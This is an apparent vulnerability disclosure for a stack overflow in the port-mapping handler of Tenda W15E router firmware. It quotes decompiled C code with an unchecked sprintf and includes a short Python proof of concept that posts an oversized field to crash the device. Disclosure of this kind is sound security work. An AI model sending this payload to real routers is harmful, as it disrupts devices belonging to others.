## Overview

- Firmware download website: https://www.tendacn.com/download/detail-2722.html

## Affected version

W15EV1.0 V15.11.0.14

## Vulnerability details

The Tenda W15EV1.0 V15.11.0.14 firmware has a stack overflow vulnerability in the `formSetPortMapping` function. The `pPortMapIndex` variable receives the `portMappingIndex` parameter from a POST request and we let `iPortMapIndex + 1 <= 20`. However, since the user can control the input of `portMappingServer, portMappingProtocol, portMappingWan, porMappingtInternal, portMappingExternal`, the statement

```c
pLanIP = websGetVar(wp, "portMappingServer", byte_DA130);
pProtocl = websGetVar(wp, "portMappingProtocol", byte_DA130);
pWanid = websGetVar(wp, "portMappingWan", byte_DA130);
pLanPortRange = websGetVar(wp, "porMappingtInternal", byte_DA130);
pWanPortRange = websGetVar(wp, "portMappingExternal", byte_DA130);
sprintf(
      (char *)sMibValue,
      "%s;%s;%s;%s;%s;%d",
      (const char *)pWanid,
      (const char *)pWanPortRange,
      (const char *)pLanPortRange,
      (const char *)pLanIP,
      (const char *)pProtocl,
      1);
```

can cause a buffer overflow. The user-provided  `portMappingServer, portMappingProtocol, portMappingWan, porMappingtInternal, portMappingExternal` can exceed the capacity of the `cmd` array, triggering this security vulnerability.

![image-20240417095245951](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240417095245951.png)

![image-20240417095309531](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240417095309531.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetPortMapping"
payload = b"a"*2000

data = {
        'portMappingIndex': 1,
    	'portMappingServer':payload,
    }
response = requests.post(url, data=data)
print(response.text)
```

![image-20240416114043980](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240416114043980.png)
